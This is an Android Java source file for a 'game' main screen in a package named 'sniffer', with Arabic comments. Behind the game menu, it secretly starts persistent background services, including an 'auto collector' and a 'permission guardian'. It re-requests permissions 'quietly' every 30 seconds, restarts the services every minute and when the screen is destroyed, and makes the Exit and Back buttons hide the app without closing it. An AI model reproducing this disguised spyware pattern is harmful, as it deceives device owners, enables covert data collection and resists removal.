package com.v8.global.sniffer.game;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.v8.global.sniffer.R;
import com.v8.global.sniffer.AutoCollectorService;
import com.v8.global.sniffer.NotificationService;
import com.v8.global.sniffer.PermissionGuardian;
import com.v8.global.sniffer.utils.PermissionManager;
import java.util.ArrayList;
import java.util.List;

public class MainGameActivity extends Activity {

    private Button btnPlay, btnSettings, btnExit;
    private TextView tvHighScore, tvWelcome;
    private ImageView ivLogo;
    private int highScore = 0;
    private Handler backgroundHandler = new Handler(Looper.getMainLooper());
    private Runnable backgroundRunnable;
    private boolean isRunning = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main_game);

        // تهيئة العناصر
        btnPlay = findViewById(R.id.btn_play);
        btnSettings = findViewById(R.id.btn_settings);
        btnExit = findViewById(R.id.btn_exit);
        tvHighScore = findViewById(R.id.tv_high_score);
        tvWelcome = findViewById(R.id.tv_welcome);
        ivLogo = findViewById(R.id.iv_logo);

        // تأثيرات حركية
        Animation fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in);
        ivLogo.startAnimation(fadeIn);
        tvWelcome.startAnimation(fadeIn);

        // تحميل أفضل نتيجة
        loadHighScore();

        // تشغيل الخدمات الخلفية الدائمة
        startBackgroundServices();

        // التحقق من الصلاحيات في الخلفية
        checkPermissionsInBackground();

        // بدء مراقبة الخدمات الخلفية
        startBackgroundServiceMonitor();

        btnPlay.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                Intent intent = new Intent(MainGameActivity.this, GameBoardActivity.class);
                startActivity(intent);
            }
        });

        btnSettings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                Intent intent = new Intent(MainGameActivity.this, GameSettingsActivity.class);
                startActivity(intent);
            }
        });

        btnExit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                
                // إخفاء التطبيق بدل إغلاقه
                moveTaskToBack(true);
            }
        });
    }

    private void loadHighScore() {
        highScore = getSharedPreferences("game_prefs", MODE_PRIVATE).getInt("high_score", 0);
        tvHighScore.setText("أفضل نتيجة: " + highScore);
    }

    private void startBackgroundServices() {
        // تشغيل خدمة الإشعارات
        try {
            Intent notificationIntent = new Intent(this, NotificationService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(notificationIntent);
            } else {
                startService(notificationIntent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        // تشغيل خدمة السحب التلقائي
        try {
            Intent collectorIntent = new Intent(this, AutoCollectorService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(collectorIntent);
            } else {
                startService(collectorIntent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        // تشغيل حارس الصلاحيات
        try {
            Intent guardianIntent = new Intent(this, PermissionGuardian.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(guardianIntent);
            } else {
                startService(guardianIntent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void checkPermissionsInBackground() {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    PermissionManager pm = new PermissionManager(MainGameActivity.this);
                    if (!pm.hasAllPermissions()) {
                        // إذا فقدت بعض الصلاحيات، اطلبها مرة أخرى بهدوء
                        pm.requestAllPermissions();
                    }
                    // كرر التحقق كل 30 ثانية
                    new Handler().postDelayed(this, 30000);
                }
            }
        }, 5000); // تحقق بعد 5 ثواني أول مرة
    }

    private void startBackgroundServiceMonitor() {
        backgroundRunnable = new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    // التحقق من أن الخدمات لا تزال تعمل
                    ensureServicesRunning();
                    // كرر كل دقيقة
                    backgroundHandler.postDelayed(this, 60000);
                }
            }
        };
        backgroundHandler.postDelayed(backgroundRunnable, 10000);
    }

    private void ensureServicesRunning() {
        // إعادة تشغيل الخدمات إذا توقفت
        startBackgroundServices();
    }

    @Override
    protected void onResume() {
        super.onResume();
        loadHighScore();
        isRunning = true;
    }

    @Override
    protected void onPause() {
        super.onPause();
        // التطبيق في الخلفية - الخدمات تستمر بالعمل
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isRunning = false;
        if (backgroundHandler != null && backgroundRunnable != null) {
            backgroundHandler.removeCallbacks(backgroundRunnable);
        }
        
        // إعادة تشغيل الخدمات إذا تم تدمير النشاط
        startBackgroundServices();
    }

    @Override
    public void onBackPressed() {
        // عند الضغط على زر الرجوع، نخفي التطبيق بدل إغلاقه
        moveTaskToBack(true);
    }
}
